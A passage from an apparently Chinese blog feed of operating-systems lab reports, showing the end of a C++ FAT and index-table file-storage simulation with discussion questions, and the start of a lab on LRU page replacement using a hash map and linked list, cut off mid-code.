个空的内存块来存储，同时更新索引</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= num; i++)<br>    &#123;<br>        <span class="hljs-comment">//找到一个空的位置</span><br>        <span class="hljs-keyword">while</span> (fat[pos] != <span class="hljs-number">0</span>)<br>            pos = (pos + <span class="hljs-number">1</span>) % <span class="hljs-number">32</span>;<br>        <span class="hljs-comment">//如果是文件的起始块号则直接存储下一个块的索引</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>)<br>            fd.start[fd.filenum] = pos;<br>        <span class="hljs-comment">//不是起始块则将上一个块的索引设置成当前的地址</span><br>        <span class="hljs-keyword">else</span><br>            fat[lastpos] = pos;<br>        <span class="hljs-comment">//记录当前地址，实际的复制内容由下一个块的地址决定</span><br>        lastpos = pos;<br>        <span class="hljs-comment">//从下一个块开始找，空出当前地址留待使用</span><br>        pos++;<br>        <span class="hljs-comment">//剩余的块少一个</span><br>        leftblocks--;<br>    &#125;<br>    <span class="hljs-comment">//将文件的结尾执行统一的结束符 FFF</span><br>    fat[lastpos] = FFF;<br>    cout &lt;&lt; <span class="hljs-string">&quot;********文件存储成功！********&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//插入文件操作</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string filename;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入文件名:&quot;</span>;<br>    cin &gt;&gt; filename;<br>    <span class="hljs-comment">//首先查找文件目录中是否有这个文件</span><br>    <span class="hljs-comment">//如果有这个文件则记录在文件目录中的索引</span><br>    <span class="hljs-keyword">int</span> pos = <span class="hljs-built_in">FindFile</span>(filename);<br>    <span class="hljs-comment">//如果没有这个文件则插入不能完成</span><br>    <span class="hljs-keyword">if</span> (pos == <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********不存在该文件，插入失败！********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//将这个块插入到文件的第 num 个位置</span><br>    <span class="hljs-keyword">int</span> num;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入要插入的文件逻辑位置:&quot;</span>;<br>    cin &gt;&gt; num;<br>    <span class="hljs-comment">//判断是否有空间存储这个插入的块</span><br>    <span class="hljs-keyword">if</span> (leftblocks == <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********无空闲块，插入失败！********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//找一个空闲的位置来存放要插入的块</span><br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (fat[p] != <span class="hljs-number">0</span>)<br>        p++;<br>    <span class="hljs-comment">//如果要在第一个位置插入，则更新起始块号</span><br>    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">1</span>)<br>    &#123;<br>        fat[p] = fd.start[pos];<br>        fd.start[pos] = p;<br>    &#125;<br>    <span class="hljs-comment">//不是在第一个位置插入</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (num &gt;= <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-comment">//找到要插入位置的前一个块号</span><br>        <span class="hljs-keyword">int</span> temp = fd.start[pos];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; num - <span class="hljs-number">1</span>; i++)<br>            temp = fat[temp];<br>        <span class="hljs-comment">//将新的位置的下一个索引指向原来的下一个块</span><br>        fat[p] = fat[temp];<br>        <span class="hljs-comment">//将上一个块的下一个索引指向新的位置，完成插入</span><br>        fat[temp] = p;<br>    &#125;<br>    <span class="hljs-comment">//更新剩余的内存块</span><br>    leftblocks--;<br>    fd.filelength[pos]++;<br>    cout &lt;&lt; <span class="hljs-string">&quot;********插入文件块成功！********&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">change_to_index</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;   <span class="hljs-comment">//打印当前文件目录</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;当前文件目录：\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------文件目录------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  文件名   起始位置  逻辑长度  |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  %6s  %8d  %9d  |\n&quot;</span>, fd.name[i].<span class="hljs-built_in">c_str</span>(), fd.start[i], fd.filelength[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入用户名，按q退出\n&quot;</span>);<br>        string name;<br>        cin &gt;&gt; name;<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-string">&quot;q&quot;</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入当前用户的文件名，按q退出\n&quot;</span>);<br>                string file;<br>                cin &gt;&gt; file;<br>                <span class="hljs-keyword">if</span> (file == <span class="hljs-string">&quot;q&quot;</span>)<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-keyword">int</span> t = <span class="hljs-built_in">FindFile</span>(file);<br>                    <span class="hljs-keyword">if</span> (!t)<br>                    &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;不存在该文件，请重新输入文件名：&quot;</span>);<br>                        <span class="hljs-keyword">continue</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        usertab[name].filetab[file].length = <span class="hljs-number">0</span>;<span class="hljs-comment">//初始化用户文件表记录数</span><br>                        <span class="hljs-keyword">int</span> cpos = fd.start[t];<br>                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; fd.filelength[t]; i++)<br>                        &#123;<br>                            usertab[name].filetab[file].tab[i] = cpos;<span class="hljs-comment">//记录物理块号</span><br>                            cpos = fat[cpos];<span class="hljs-comment">//到下一个物理块</span><br>                            usertab[name].filetab[file].length++;<span class="hljs-comment">//记录数加一</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">info_change_after</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    map&lt;string, Filetab&gt;::iterator it;<br>    map&lt;string, Indextab&gt;::iterator fileit;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;**********************************\n&quot;</span>);<br>    <span class="hljs-comment">// fflush(stdin);</span><br>    <span class="hljs-keyword">for</span> (it = usertab.<span class="hljs-built_in">begin</span>(); it != usertab.<span class="hljs-built_in">end</span>(); it++)<br>    &#123;<br>        <span class="hljs-comment">// fflush(stdin); //重写操作。目的是清除缓存。</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|-----------------------|\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|----用户%4s的索引表---|\n&quot;</span>, it-&gt;first.<span class="hljs-built_in">c_str</span>());<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------------|\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (fileit = usertab[it-&gt;first].filetab.<span class="hljs-built_in">begin</span>(); fileit != usertab[it-&gt;first].filetab.<span class="hljs-built_in">end</span>(); fileit++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------文件名:%s-------|\n&quot;</span>, fileit-&gt;first.<span class="hljs-built_in">c_str</span>());<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   记录号   物理块号   |\n&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; fileit-&gt;second.length; j++)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| %8d   %8d   |\n&quot;</span>, j + <span class="hljs-number">1</span>, fileit-&gt;second.tab[j]);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------------------|\n&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出文件目录和 fat</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-----------文件目录------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  文件名   起始位置  逻辑长度  |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|  %6s  %8d  %9d  |\n&quot;</span>, fd.name[i].<span class="hljs-built_in">c_str</span>(), fd.start[i], fd.filelength[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|-------------------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n|--------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|---文件定位表(fat)--|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------|\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|    索引    内容    |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      0      FDF    |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|      1      FFF    |\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %4d    %4d     |\n&quot;</span>, i, fat[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|--------------------|\n\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//功能选择清单</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">choicelist</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|====================================================================|&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|---------------MS-DOS磁盘文件存储管理菜单和索引文件结构-------------|&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      1.向fat中存储一个文件:                        |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      2.向fat中的文件插入数据:                      |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      3.输出当前文件目录以及fat信息:                |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      4.转换成索引表:                               |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      5.输出转换后的索引表:                         |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|                      6.结束操作，退出系统:                         |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|====================================================================|&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">10</span>];<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-keyword">int</span> order;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-comment">//通过字符串输入来选择想要测试的功能</span><br>        <span class="hljs-built_in">choicelist</span>();<br>        cout &lt;&lt; <span class="hljs-string">&quot;请输入你要执行的操作的编号: &quot;</span>;<br>        cin &gt;&gt; order;<br>        <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (order)<br>        &#123;<br>        <span class="hljs-comment">//存 一个文件</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">save</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//在指定的文件中的特定位置插入一个块</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">insert</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//显示当前的系统信息</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            <span class="hljs-built_in">info</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//测试结束退出系统3</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-built_in">change_to_index</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">info_change_after</span>();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            cout &lt;&lt; <span class="hljs-string">&quot;系统结束&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//输入指令不合法</span><br>        <span class="hljs-keyword">default</span>:<br>            cout &lt;&lt; <span class="hljs-string">&quot;指令输入错误&quot;</span> &lt;&lt; endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果-2"><a class="markdownIt-Anchor" href="#程序初值和运行结果-2"></a> 程序初值和运行结果</h4><p>转化成索引表：</p><p><img src="/posts/6255939a/image-20211219194600309.png" alt="image-20211219194600309"></p><p>打印当前文件索引表：</p><p><img src="/posts/6255939a/image-20211219194647820.png" alt="image-20211219194647820"></p><p>插入文件后输出文件fat表</p><p><img src="/posts/6255939a/image-20211219194915960.png" alt="image-20211219194915960"></p><p>将新插入的文件加入索引结构中：</p><p><img src="/posts/6255939a/image-20211219194954473.png" alt="image-20211219194954473"></p><p><img src="/posts/6255939a/image-20211219195026995.png" alt="image-20211219195026995"></p><h3 id="思考题-2"><a class="markdownIt-Anchor" href="#思考题-2"></a> 思考题：</h3><p><strong>1. 链表文件结构和索引文件结构各自的优缺点是什么？</strong></p><ul><li><p><strong>链式结构</strong></p><p>优点：</p><ol><li>动态数据结构：链表是一种动态数据结构，因此它可以在运行时通过分配和取消分配内存来增长和缩小。所以没有必要给出链表的初始大小。</li><li>易于插入和删除：在链表中进行插入和删除节点真的很容易。在链表中，我们只需要更新节点下一个指针中的地址。</li><li>磁盘空间利用率、内存利用率高：由于链表的大小可以在运行时增加或减少，因此没有内存浪费。</li></ol><p>缺点：</p><ol><li>存取速度慢，不适于随机存取；</li><li>当物理块间的连接指针出错时，数据丢失；</li><li>更多的寻道次数和寻道时间；链接指针占用一定的空间，降低了空间利用率。</li></ol></li><li><p><strong>索引结构</strong><br>优点：</p><ol><li>通过创建唯一性索引，可以保证数据库表中每一行数据的唯一性；</li><li>可以大大加快数据的检索速度，这也是创建索引的最主要的原因；可以加速表和表之间的连接，特别是在实现数据的参考完整性方面特别有意义；</li><li>在使用分组和排序子句进行数据检索时，同样可以显著减少查询中分组和排序的时间；</li><li>通过使用索引，可以在查询的过程中，使用优化隐藏器，提高系统的性能。</li></ol><p>缺点：</p><ol><li>创建索引和维护索引要耗费时间，因为这导致了较多的寻道次数和寻道时间，这种时间随着数据量的增加而增加；</li><li>索引需要占物理空间，除了数据表占数据空间之外，每一个索引还要占一定的物理空间，如果要建立聚簇索引，那么需要的空间就会更大；</li><li>当对表中的数据进行增加、删除和修改的时候，索引也要动态的维护，这样就降低了数据的维护速度。</li></ol></li></ul><p><strong>2.当文件较大时，使得索引表也较大，如果索引表的大小超过了一个物理块，如何进行索引表的存取？</strong></p><p>如果索引表的大小超过了一个物理块，可以采用间接索引(多重索引)的方式来解决，也就是在索引表所指的物理块中存放的不是文件信息，而是装有这些信息的物理块地址，这样，如果一个物理块可装下n个物理块地址，则经过一级间接索引，可寻址的文件长度将变为n×n块。如果文件长度还大于n×n块，还可以进行类似的扩充，即二级间接索引。</p><p>这样就对索引表的长度没有限制了，但是同时也会增加很多空间上的开销。如果是使用分页式管理位示图算法，文件存储的时候是按照块来分割的，内存的空间也是按照块来分割的，所以就一定是能够充分利用内存空间的，不会造成浪费。但是同时，这种算法实现起来复杂度较高，虽然寻找空闲块比较简单，但是文件的读取和存储都是分块进行的，而且位置之间没有顺序性，所以读取和存储的寻址和处理的时间代价很大，算法复杂度较高。另外，这种算法是需要页表来进行维系的，页表也需要存储，会造成空间的浪费，如果内存分块块比较小，数量很多，会导致页表非常大，极限情况下，内存会被页表完全占领，造成极大的浪费，效率受到影响。</p><h3 id="五-实验总结"><a class="markdownIt-Anchor" href="#五-实验总结"></a> 五、实验总结</h3><p>本次实验第一题相对比较容易，通过用数组来模拟链表结构可以成功实现，第二题的难点在于三级索引结构的设计，如果都使用结构体使得代码较为复杂冗长，所以经过思考后，我采用了stl中的map来作为用户名和文件表的映射以及文件名和索引表的映射，这使得代码量大大减小，成功实现该功能。</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统Lab7-内存页面置换算法的设计和主存储器空间的分配和回收</title>
    <link href="/posts/6c024da0/"/>
    <url>/posts/6c024da0/</url>
    
    <content type="html"><![CDATA[<h1 id="实验1内存页面置换算法的设计"><a class="markdownIt-Anchor" href="#实验1内存页面置换算法的设计"></a> 实验1：内存页面置换算法的设计</h1><h2 id="一-实验内容"><a class="markdownIt-Anchor" href="#一-实验内容"></a> 一、实验内容</h2><ul><li>实现最近最久未使用(LRU)置换算法</li></ul><h2 id="二-实验目的"><a class="markdownIt-Anchor" href="#二-实验目的"></a> 二、实验目的</h2><ul><li>LINUX中，为了提高内存利用率，提供了内外存进程对换机制，内存空间的分配和回收均以页为单位进行，一个进程只需将其一部分调入内存便可运行，还支持请求调页的存储管理方<br>式。</li><li>本实验要求学生通过请求页式存储管理中页面置换算法模拟设计，了解虚拟存储技术的特点，掌握请求页式存储管理的页面置换算法。</li></ul><h2 id="三-实验题目"><a class="markdownIt-Anchor" href="#三-实验题目"></a> 三、实验题目</h2><ul><li><p>最近最久未使用（LRU）置换算法原理就是：当需要淘汰某页面时，选择当前一段时间内最久未使用过的页先淘汰，即淘汰距当前最远的上次使用的页。</p></li><li><p>假定分配给该进程的页块数为3，页面访问序列长度为20。本实验可以采用数组结构实现，首先随机产生页面序列，当发生请求调页时，若内存已满，则需要利用LRU算法，将当前一段时间内最久未使用过的页替换出去。</p></li><li><p>模拟程序的算法如下图：</p><p><img src="/posts/6c024da0/image-20211212154524278.png" alt="image-20211212154524278"></p></li></ul><p><strong>思考题</strong></p><ul><li>比较LRU和其他置换算法各自的优缺点，能够实现其他置换算法模拟设计，分析内存页面数的变化对各种置换算法命中率的影响</li></ul><h2 id="四-实验设计与过程"><a class="markdownIt-Anchor" href="#四-实验设计与过程"></a> 四、实验设计与过程</h2><p>LRU算法实现并不难，但需考虑如何高效实现，本实验中我采用了哈希表和双向链表的结合来高效实现其中的插入、删除、查找，均可在O(1)时间内完成插入、删除、查找，利用空间换时间的思想，实现LRU算法。</p><h4 id="数据结构和符号说明"><a class="markdownIt-Anchor" href="#数据结构和符号说明"></a> 数据结构和符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-keyword">int</span> key;<br>        <span class="hljs-keyword">int</span> value;<br>        <span class="hljs-built_in">Node</span>(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y) : <span class="hljs-built_in">key</span>(x), <span class="hljs-built_in">value</span>(y) &#123;&#125;<br>    &#125;;<br>    <span class="hljs-keyword">int</span> capacity;<span class="hljs-comment">//内存页面容量</span><br>    <span class="hljs-keyword">int</span> missing = <span class="hljs-number">0</span>;<span class="hljs-comment">//是否缺页</span><br>    list&lt;Node&gt; cacheList;<span class="hljs-comment">//双向链表</span><br>    unordered_map&lt;<span class="hljs-keyword">int</span>, list&lt;Node&gt;::iterator&gt; cacheMap; <span class="hljs-comment">//哈希表</span><br></code></pre></div></td></tr></table></figure><h4 id="函数说明"><a class="markdownIt-Anchor" href="#函数说明"></a> 函数说明</h4><p>首先在哈希表中查找</p><ul><li><p>若没找到，说明当前页不在页面内存中，需要进行页面替换</p><ul><li>然后再看是否有空闲页，即判断双向链表容量是否已满，若满则要删除链表尾部元素，即最久未访问的页面，然后将新页面加到双向链表头部，同时更新哈希表</li></ul></li><li><p>若找到，则将该页放到链表头部，表示刚刚访问过，同时更新哈希表。</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key, <span class="hljs-keyword">int</span> val)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (cacheMap.<span class="hljs-built_in">find</span>(key) == cacheMap.<span class="hljs-built_in">end</span>())<br>        &#123;<br>            missing = <span class="hljs-number">1</span>; <span class="hljs-comment">//表示缺页</span><br>            <span class="hljs-comment">//淘汰最后一个，然后将其加到第一个位置</span><br>            <span class="hljs-keyword">if</span> (cacheList.<span class="hljs-built_in">size</span>() == capacity)<br>            &#123;<br>                cacheMap.<span class="hljs-built_in">erase</span>(cacheList.<span class="hljs-built_in">back</span>().key);<br>                cacheList.<span class="hljs-built_in">pop_back</span>();<br>            &#125;<br>            cacheList.<span class="hljs-built_in">push_front</span>(<span class="hljs-built_in">Node</span>(key, val));<br>            cacheMap[key] = cacheList.<span class="hljs-built_in">begin</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            missing = <span class="hljs-number">0</span>; <span class="hljs-comment">//表示未缺页</span><br>            <span class="hljs-comment">//更新节点的值，并将其加到第一个位置,map和list均要更新</span><br>            cacheMap[key]-&gt;value = val;<br>            cacheList.<span class="hljs-built_in">splice</span>(cacheList.<span class="hljs-built_in">begin</span>(), cacheList, cacheMap[key]);<br>            cacheMap[key] = cacheList.<span class="hljs-built_in">begin</span>();<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h4 id="完整源代码"><a class="markdownIt-Anchor" href="#完整源代码"></a> 完整源代码</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">int</span> pagelist[<span class="hljs-number">20</span>];<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">buildpage</span><span class="hljs-params">()</span> <span class="hljs-comment">//内存页初始化函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++)<br>    &#123;<br>        <span class="hljs-comment">// cin &gt;&gt; pagelist[i];</span><br>        pagelist[i] = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">6</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LRUCache</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">LRUCache</span>(<span class="hljs-keyword">int</span> c) : <span class="hljs-built_in">capacity</span>(c) &#123;&#125; <span class="hljs-comment">//页面数量初始化</span><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span>                 <span class="hljs-comment">//查找</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (cacheMap.<span class="hljs-built_in">find</span>(key) == cacheMap.<span class="hljs-built_in">end</span>())<br>            <span class="hljs-keyword">return</span> <span 